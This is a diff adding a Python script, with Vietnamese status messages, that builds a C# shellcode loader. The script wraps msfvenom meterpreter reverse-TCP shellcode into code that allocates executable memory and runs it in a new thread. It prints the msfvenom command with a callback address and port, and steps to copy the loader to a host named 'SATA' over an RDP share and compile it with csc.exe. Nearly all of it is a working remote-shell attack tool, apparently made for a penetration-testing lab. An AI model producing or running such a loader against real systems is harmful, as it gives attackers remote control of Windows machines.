@@ -1,0 +1,40 @@
+import os, sys
+
+downloads = os.path.expanduser("~/Downloads")
+buf_path = os.path.join(downloads, "bak.txt")
+out_path = os.path.join(downloads, "shell.cs")
+
+if not os.path.exists(buf_path):
+    print(f"[!] Khong tim thay {buf_path}")
+    print("    Chay: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.101 LPORT=2222 -f csharp -o ~/Downloads/bak.txt")
+    sys.exit(1)
+
+buf_line = open(buf_path).read().strip()
+
+cs = r'''using System;
+using System.Runtime.InteropServices;
+class P {
+    [DllImport("kernel32.dll")]
+    static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p);
+    [DllImport("kernel32.dll")]
+    static extern IntPtr CreateThread(IntPtr a, uint s, IntPtr f, IntPtr p, uint c, IntPtr i);
+    [DllImport("kernel32.dll")]
+    static extern uint WaitForSingleObject(IntPtr h, uint d);
+    static void Main() {
+''' + "        " + buf_line + r'''
+        IntPtr m = VirtualAlloc(IntPtr.Zero, (uint)buf.Length, 0x3000, 0x40);
+        System.Runtime.InteropServices.Marshal.Copy(buf, 0, m, buf.Length);
+        WaitForSingleObject(
+            CreateThread(IntPtr.Zero, 0, m, IntPtr.Zero, 0, IntPtr.Zero),
+            0xFFFFFFFF);
+    }
+}
+'''
+
+open(out_path, "w").write(cs)
+print(f"[+] Da tao: {out_path}")
+print(f"    Size: {len(cs)} bytes")
+print()
+print("Buoc tiep theo tren SATA:")
+print("  copy \\\\tsclient\\kali\\shell.cs C:\\Users\\Public\\shell.cs")
+print("  C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /out:C:\\Users\\Public\\shell.exe C:\\Users\\Public\\shell.cs")
